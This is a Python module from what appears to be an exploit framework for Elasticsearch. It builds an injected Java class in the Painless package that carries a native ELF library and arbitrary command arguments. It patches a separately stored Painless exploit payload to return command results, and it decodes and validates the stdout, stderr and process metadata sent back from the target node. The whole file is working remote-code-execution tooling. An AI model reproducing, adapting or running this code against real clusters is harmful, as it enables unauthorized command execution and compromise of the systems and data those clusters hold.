"""Build the request-supplied command class and validate its result envelope.

render_request_class() embeds argv and the local native build into the Java
template in templates/OwnedCommand.java.template. checked_payload() adapts the pinned Painless return contract;
decode_result() verifies the token-bound command response. The original
decoder trigger and repair sequence are not generated by this module.
"""
from __future__ import annotations

import base64
import binascii
import hashlib
import json
from pathlib import Path
import re
import secrets
import struct

PACKAGE = "org.elasticsearch.painless"
BRIDGE = PACKAGE + ".OwnedNativeCommand"
SUCCESS_CHECK = "'success':markerResult==(String)params.marker_return&&"
COMMAND_SUCCESS_CHECK = ("'success':markerResult!=null&&"
                         "((String)markerResult).startsWith((String)params.marker_return+':')&&")
RESULT_FIELD = "'bytecode_result':markerResult,"
COMMAND_RESULT_FIELD = ("'bytecode_result':markerResult!=null&&"
                        "((String)markerResult).startsWith((String)params.marker_return+':')?"
                        "(String)params.marker_return:markerResult,"
                        "'command_result':markerResult,")


def checked_payload(source: str, expected_sha256: str, nonce: str) -> str:
    """Extend only the reviewed payload return contract and give it a fresh cache key."""
    if re.fullmatch(r"[0-9a-f]{24}", nonce) is None:
        raise ValueError("Invalid request nonce")
    if hashlib.sha256(source.encode()).hexdigest() != expected_sha256:
        raise ValueError("The original Painless source differs from its reviewed hash")
    if source.count(SUCCESS_CHECK) != 1 or source.count(RESULT_FIELD) != 1:
        raise ValueError("The original Painless result check is not unique")
    # Extend only the reviewed marker-result contract. The decoder trigger,
    # corruption witness and repair sequence remain the original payload's.
    # Painless caches compiled call sites. Each supplied class needs a fresh
    # source key, including requests made by separate client invocations.
    return ("// original-decoder command " + nonce + "\n"
            + source.replace(SUCCESS_CHECK, COMMAND_SUCCESS_CHECK)
            .replace(RESULT_FIELD, COMMAND_RESULT_FIELD))


def _chunks(data: bytes) -> str:
    # javac limits each constant-pool string. Separate Base64 literals let the
    # generated class embed the complete library and maximum-size argv safely.
    text = base64.b64encode(data).decode("ascii")
    return ",\n            ".join(json.dumps(text[i:i + 20000])
                                      for i in range(0, len(text), 20000))


def _encoded_argv(argv: list[str]) -> bytes:
    # A length-prefixed UTF-8 vector preserves argument boundaries without a
    # shell or delimiter escaping. Count the terminating NULs in the native
    # command's aggregate size limit.
    if not argv or len(argv) > 64 or not argv[0].startswith("/"):
        raise ValueError("Use an absolute executable path and at most 64 arguments")
    data = bytearray(struct.pack(">I", len(argv)))
    total = 0
    for arg in argv:
        if not isinstance(arg, str) or "\0" in arg:
            raise ValueError("Command arguments must be text without NUL")
        value = arg.encode("utf-8")
        if len(value) > 32768:
            raise ValueError("A command argument exceeds 32 KiB")
        total += len(value) + 1
        if total > 131072:
            raise ValueError("The complete command exceeds 128 KiB")
        data.extend(struct.pack(">I", len(value)))
        data.extend(value)
    return bytes(data)


def render_request_class(bridge_class: bytes, library: bytes, argv: list[str],
                         timeout: int, nonce: str | None = None,
                         *, build_id: str, create_marker: bool = True) -> dict:
    """Generate one command class with a unique identity and embedded native artifacts.

    create_marker is enabled only for the controlled local comparison. The
    normal client still performs permission probes but creates no named proof.
    The Java template defines the exact bytes compiled for each request."""
    if not 1 <= timeout <= 300:
        raise ValueError("Command timeout must be between 1 and 300 seconds")
    if type(create_marker) is not bool:
        raise ValueError("Marker-file selection must be Boolean")
    if not bridge_class.startswith(b"\xca\xfe\xba\xbe"):
        raise ValueError("The native bridge is not a Java class")
    if not library.startswith(b"\x7fELF") or len(library) > 4 * 1024 * 1024:
        raise ValueError("The native bridge library is not a supported ELF file")
    if re.fullmatch(r"[0-9a-f]{64}", build_id) is None:
        raise ValueError("The native bridge build identity is missing")
    nonce = secrets.token_hex(12) if nonce is None else nonce
    if re.fullmatch(r"[0-9a-f]{24}", nonce) is None:
        raise ValueError("Invalid request nonce")
    # A unique class name avoids redefinition in a retained node. Its own
    # compiled-in token distinguishes this invocation from a cached earlier one.
    simple_name = "OwnedCommand" + nonce
    token = "owned-command-" + nonce
    values = {"CLASS": simple_name, "TOKEN": token,
              "BRIDGE": _chunks(bridge_class), "LIBRARY": _chunks(library),
              "LIBRARY_SHA": hashlib.sha256(library).hexdigest(),
              "BUILD_ID": build_id,
              "ARGV": _chunks(_encoded_argv(argv)),
              "TIMEOUT": str(timeout),
              "CREATE_MARKER": "true" if create_marker else "false"}
    source = (Path(__file__).parent / "templates/OwnedCommand.java.template").read_text()
    for key, value in values.items():
        source = source.replace("@@" + key + "@@", value)
    if "@@" in source:
        raise ValueError("Unexpanded Java marker template")
    return {"source": source, "nonce": nonce, "binary_name": PACKAGE + "." + simple_name,
            "simple_name": simple_name, "marker_return": token,
            "source_sha256": hashlib.sha256(source.encode()).hexdigest(),
            "bridge_class_sha256": hashlib.sha256(bridge_class).hexdigest(),
            "native_library_sha256": values["LIBRARY_SHA"], "bridge_build_id": build_id, "argv": argv,
            "command_timeout": timeout, "marker_file_expected": create_marker}


def _unique_object(pairs):
    result = {}
    for key, value in pairs:
        if key in result:
            raise ValueError("Duplicate command response field: " + key)
        result[key] = value
    return result


def _reject_constant(value):
    raise ValueError("Non-finite JSON number: " + value)


_NATIVE_STAGES = {"none", "argv", "open", "permission", "file_changed", "elf",
                  "interpreter", "address_collision", "map", "stack", "pipe",
                  "clone", "subreaper", "child_fds", "child_setup", "wait",
                  "timeout", "descendants", "protocol", "kernel"}
_NATIVE_INTEGERS = {
    "error_errno": (0, 4095), "supervisor_pid": (-1, 2147483647),
    "supervisor_status": (0, 255), "child_pid": (-1, 2147483647),
    "exit_code": (-1, 255), "term_signal": (0, 64),
    "descendants_reaped": (0, 2147483647), "no_new_privs": (-1, 1),
    "seccomp": (-1, 2), "executable_dev": (0, 2**64 - 1),
    "executable_ino": (0, 2**64 - 1), "executable_size": (0, 2**63 - 1),
}
_NATIVE_BOOLEANS = {"supervisor_reaped", "timeout", "cleanup_complete",
                    "stdout_truncated", "stderr_truncated"}


def validate_native_metadata(meta: dict) -> None:
    """Reject malformed or contradictory native completion and ownership fields."""
    # Treat the native result as a strict protocol: a completed command must
    # also establish its child status and known supervisor/descendant cleanup.
    required = set(_NATIVE_INTEGERS) | _NATIVE_BOOLEANS | {"status", "stage"}
    if type(meta) is not dict or set(meta) != required:
        raise ValueError("The native result metadata has the wrong fields")
    if type(meta["status"]) is not str or meta["status"] not in {
            "completed", "unsupported", "error", "cleanup_unknown", "timeout"}:
        raise ValueError("Unknown native result status")
    if type(meta["stage"]) is not str or meta["stage"] not in _NATIVE_STAGES:
        raise ValueError("Unknown native result stage")
    for key, (lower, upper) in _NATIVE_INTEGERS.items():
        if type(meta[key]) is not int or not lower <= meta[key] <= upper:
            raise ValueError("Invalid native integer field: " + key)
    for key in _NATIVE_BOOLEANS:
        if type(meta[key]) is not bool:
            raise ValueError("Invalid native Boolean field: " + key)
    if meta["supervisor_pid"] == 0 or meta["child_pid"] == 0:
        raise ValueError("A native process identity cannot be zero")
    cleanup_known = (meta["cleanup_complete"] and meta["supervisor_reaped"]
                     and meta["supervisor_status"] == 0)
    if meta["status"] == "completed":
        exited = meta["exit_code"] >= 0 and meta["term_signal"] == 0
        signaled = meta["exit_code"] == -1 and meta["term_signal"] > 0
        if (meta["stage"] != "none" or meta["error_errno"] != 0 or not cleanup_known
                or meta["supervisor_pid"] <= 0 or meta["child_pid"] <= 0
                or meta["timeout"] or not (exited or signaled)):
            raise ValueError("Contradictory completed native result")
    elif meta["status"] == "cleanup_unknown" and cleanup_known:
        raise ValueError("Contradictory unknown-cleanup native result")
    elif meta["status"] == "timeout" and not meta["timeout"]:
        raise ValueError("Contradictory native timeout result")
    elif meta["status"] in {"unsupported", "error"} and meta["stage"] == "none":
        raise ValueError("Native error result has no error stage")


def _decode_base64(value, maximum: int, label: str) -> bytes:
    if type(value) is not str or len(value) > 4 * ((maximum + 2) // 3):
        raise ValueError("Invalid or oversized " + label)
    try:
        raw = base64.b64decode(value, validate=True)
    except (binascii.Error, UnicodeError) as error:
        raise ValueError("Malformed Base64 in " + label) from error
    if len(raw) > maximum:
        raise ValueError("Decoded " + label + " exceeds its size limit")
    return raw


def decode_result(value: str, expected_token: str) -> dict:
    """Decode the token-bound command envelope into metadata and exact byte streams.

    This checks the wire protocol. The caller must also check the Painless
    class/repair proof and the expected output for its particular command."""
    # Check the request-specific token both outside and inside the encoded JSON.
    # Closed field sets, exact types and consistency checks reject a partial or
    # contradictory response before the client prints any target output.
    if type(expected_token) is not str or re.fullmatch(r"owned-command-[0-9a-f]{24}", expected_token) is None:
        raise ValueError("Invalid expected command token")
    prefix = expected_token + ":"
    if not isinstance(value, str) or not value.startswith(prefix):
        raise ValueError("The command response has the wrong compiled-in token")
    encoded = value[len(prefix):]
    raw = _decode_base64(encoded, 256 * 1024, "command response")
    document = json.loads(raw.decode("utf-8"), object_pairs_hook=_unique_object,
                          parse_constant=_reject_constant)
    if type(document) is not dict or type(document.get("protocol")) is not int or document["protocol"] != 2:
        raise ValueError("Unknown command response protocol")
    if type(document.get("token")) is not str or document["token"] != expected_token:
        raise ValueError("The decoded command response has the wrong token")
    common = {"protocol", "token", "state", "library_anonymous",
              "library_descriptor_closed", "marker_file_created", "library_cleanup_error"}
    for key in ("library_anonymous", "library_descriptor_closed", "marker_file_created"):
        if type(document.get(key)) is not bool:
            raise ValueError("Missing or invalid command ownership field: " + key)
    cleanup_error = document.get("library_cleanup_error")
    if "library_cleanup_error" in document and (type(cleanup_error) is not str or not cleanup_error):
        raise ValueError("Invalid library cleanup error field")
    if document["library_descriptor_closed"] != (cleanup_error is None):
        raise ValueError("Contradictory library descriptor cleanup result")
    if document.get("state") == "completed":
        if not document["library_anonymous"]:
            raise ValueError("Completed command did not use an anonymous library")
        if set(document) - (common | {"metadata", "stdout_base64", "stderr_base64"}):
            raise ValueError("Unexpected completed command response field")
        for key in ("stdout_base64", "stderr_base64"):
            document[key.removesuffix("_base64")] = _decode_base64(document.get(key), 65536, key)
        validate_native_metadata(document.get("metadata"))
    elif document.get("state") == "error":
        if set(document) - (common | {"error"}) or type(document.get("error")) is not str or not document["error"]:
            raise ValueError("Malformed command error response")
    else:
        raise ValueError("Unknown command result state")
    return document
